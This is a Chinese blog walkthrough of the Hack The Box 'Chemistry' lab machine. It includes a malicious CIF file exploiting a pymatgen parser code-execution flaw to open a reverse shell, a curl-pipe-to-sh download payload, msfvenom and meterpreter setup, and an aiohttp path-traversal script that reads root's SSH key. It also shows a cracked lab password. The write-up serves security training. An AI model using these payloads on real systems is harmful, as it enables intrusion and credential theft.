
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/GuijiH6/p/18798538" title="发布于 2025-03-28 17:55">
    <span role="heading" aria-level="2">Hack The Box-Chemistry靶机渗透</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<blockquote>
<p>通过信息收集访问5000端口，cif历史cve漏洞反弹shell，获取数据库，利用低权限用户登录，监听端口，开放8080端口，aihttp服务漏洞文件包含，获取root密码hash值，ssh指定登录</p>
</blockquote>
<p>靶机信息</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250321203042928.png" alt="" loading="lazy"></p>
<p>最终目标</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250321203520599.png" alt="" loading="lazy"></p>
<h1 id="一信息收集">一、信息收集</h1>
<p>nmap扫描，开放了<strong>22和5000</strong>端口</p>
<pre><code>Werkzeug/3.0.3 Python/3.9.5
OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250321203852327.png" alt="" loading="lazy"></p>
<p>访问5000端口，是一个<strong>CIF</strong>仪器面板</p>
<pre><code class="language-php"># CIF（Crystallographic Information File）是一种用于描述晶体结构的文件格式。它广泛应用于化学、材料科学和固体物理等领域，特别是在晶体学研究中。CIF文件包含了关于晶体的详细信息，包括原子位置、晶格参数、对称性、空间群等。
</code></pre>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250321204521675.png" alt="" loading="lazy"></p>
<p>登录尝试弱口令无果，随便注册一个账户登录，发现一处示例</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250321204855365.png" alt="" loading="lazy"></p>
<p>下载下来查看一下</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250321204945944.png" alt="" loading="lazy"></p>
<p>尝试搜索组件漏洞信息</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250321205454936.png" alt="" loading="lazy"></p>
<p>查找到<strong>cif</strong>漏洞</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250321210002345.png" alt="" loading="lazy"></p>
<p>发现可以利用<strong>命令执行反弹shell</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250321210015259.png" alt="" loading="lazy"></p>
<h1 id="二获取shell">二、获取shell</h1>
<p>这里先看一下我们<strong>kali挂完代理的ip</strong>，这个地方我自己犯了一个致命错误，因为是第一次打htb靶机，忽略了kali挂代理ip会变，使用的是本机的ip进行反弹shell，导致一直反弹不成功</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322103855317.png" alt="" loading="lazy"></p>
<h2 id="命令执行反弹shell">命令执行反弹shell</h2>
<p>修改脚本反弹shell到kali</p>
<pre><code class="language-bash">data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.20/4444 0&gt;&amp;1'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
</code></pre>
<p>上传该文件</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250321210943706.png" alt="" loading="lazy"></p>
<p>点击<strong>View</strong>，成功获取<strong>反弹shell</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322103712606.png" alt="" loading="lazy"></p>
<h2 id="msfconsole获取shell">msfconsole获取shell</h2>
<p>执行以下命令，使用两个命令面板</p>
<pre><code class="language-bash">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.16.20 lport=4444 -f elf&gt;aa.elf
python3 -m http.server 80

msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost 10.10.16.20 #kali的ip
set lport 4444
run
</code></pre>
<h2 id="远程下载执行脚本提权">远程下载执行脚本提权</h2>
<p>先把反弹shell脚本写入到sh文件，然后上传web</p>
<pre><code class="language-bash">echo -ne '#!/bin/bash\n/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.20/4444 0&gt;&amp;1"' &gt; shell.sh
sudo python3 -m http.server 80
</code></pre>
<p>新建cif文件，然后写入以下命令，利用<strong>curl</strong>下载命令下载脚本，然后执行</p>
<pre><code class="language-bash">data_5yOhtAoR
_audit_creation_date &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 2018-06-08
_audit_creation_method &nbsp; &nbsp; &nbsp; &nbsp; "Pymatgen CIF Parser Arbitrary Code Execution 
Exploit"
loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]
_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in 
().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + 
"classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system 
("curl http://10.10.16.20/shell.sh|sh");0,0,0'
_space_group_magn.number_BNS 62.448
</code></pre>
<h1 id="三提权">三、提权</h1>
<p>先基础查找信息</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322105223520.png" alt="" loading="lazy"></p>
<p>查看<strong>suid</strong>信息，没什么可利用的</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322105742775.png" alt="" loading="lazy"></p>
<p>查看<strong>/etc/passwd</strong>看看有没有什么泄露的，发现一个可以执行bash的用户<strong>rosa</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322105821610.png" alt="" loading="lazy"></p>
<p>查看文件系统，没有什么可以利用的</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322105956787.png" alt="" loading="lazy"></p>
<p>进入该目录查看，发现一处数据库信息</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322110115524.png" alt="" loading="lazy"></p>
<p>​           使用<strong>sqlite3</strong>查看，然后查看<strong>user表的所有列</strong>，得到的所有用户名和密码hash值，注意这个rosa用户的密码<strong>63ed86ee9f624c7b14f1d4f43dc251a5</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322110942273.png" alt="" loading="lazy"></p>
<p>解密一下，得到密码：<strong>unicorniosrosados</strong></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322111155093.png" alt="" loading="lazy"></p>
<p>这里我直接切换用户不成功，就ssh连接了，不过连接后可能会有些延迟</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322111652385.png" alt="" loading="lazy"></p>
<p>查看当前目录，发现第一个flag</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322111732215.png" alt="" loading="lazy"></p>
<p>列出当前系统上所有处于监听状态（LISTEN）的网络端口，有一个本地服务</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322112458444.png" alt="" loading="lazy"></p>
<p>了解一下http-alt</p>
<pre><code class="language-php"># 替代端口：在某些网络环境中，可能会使用非标准端口（如8080、8000等）来运行HTTP服务。这些端口被称为“替代端口”，可以用于绕过防火墙限制或进行特定的网络配置。
# 代理服务器：在某些情况下，HTTP-ALT可能涉及到通过代理服务器进行HTTP请求，这些代理可能会监听不同的端口。
# 应用程序和服务：某些应用程序或服务可能会在非标准端口上提供HTTP接口，这些接口也可以被称为HTTP-ALT。
</code></pre>
<p>把网页内容下载下来，看到服务信息</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322112620300.png" alt="" loading="lazy"></p>
<p>搜索历史漏洞，找到一个exp：<a href="https://github.com/z3rObyte/CVE-2024-23334-PoC" target="_blank" rel="noopener nofollow">https://github.com/z3rObyte/CVE-2024-23334-PoC</a></p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322112812689.png" alt="" loading="lazy"></p>
<p>修改poc</p>
<pre><code class="language-sh">#!/bin/bash

url="http://localhost:8080" #目标url
string="../"
payload="/assets/"     #路径
file="root/.ssh/id_rsa" # 查看hash值 /

for ((i=0; i&lt;15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --&gt; $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
</code></pre>
<p>执行该脚本，可以执行</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322120015030.png" alt="" loading="lazy"></p>
<p>开启web服务</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322115945751.png" alt="" loading="lazy"></p>
<p><strong>wget</strong>下载，然后赋予权限执行，拿到root密码hash值</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322115936820.png" alt="" loading="lazy"></p>
<p>如下，一定要<strong>完整保存</strong></p>
<pre><code class="language-sh">-----BEGIN OPENSSH PRIVATE KEY-----

-----END OPENSSH PRIVATE KEY-----
</code></pre>
<p>新建文件存放key，赋予只可管理员读写权限</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322121126739.png" alt="" loading="lazy"></p>
<p>ssh使用key连接</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322121139736.png" alt="" loading="lazy"></p>
<p>成功连接，发现flag文件</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322121158737.png" alt="" loading="lazy"></p>
<p>结束</p>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250325215902836.png" alt="" loading="lazy"></p>
<h1 id="四总结">四、总结</h1>
<h2 id="知识点">知识点</h2>
<ul>
<li><strong>msfconsole获取shell：</strong></li>
<li><strong>远程下载文件执行获取shell：</strong></li>
<li><strong>sqlite3：</strong>  用于操作 <strong>SQLite 数据库</strong>的命令行工具 ，可以执行mysql命令</li>
<li><strong>netstat -l：</strong>  列出当前系统上所有处于监听状态（LISTEN）的网络端口</li>
<li><strong>http-alt：</strong> 非标准端口，如8080</li>
</ul>
<h2 id="任务1-4">任务1-4</h2>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322121405702.png" alt="" loading="lazy"></p>
<h2 id="任务5-8">任务5-8</h2>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322121417582.png" alt="" loading="lazy"></p>
<h2 id="任务9-12">任务9-12</h2>
<p><img src="https://track123.oss-cn-beijing.aliyuncs.com/20250322121436025.png" alt="" loading="lazy"></p>
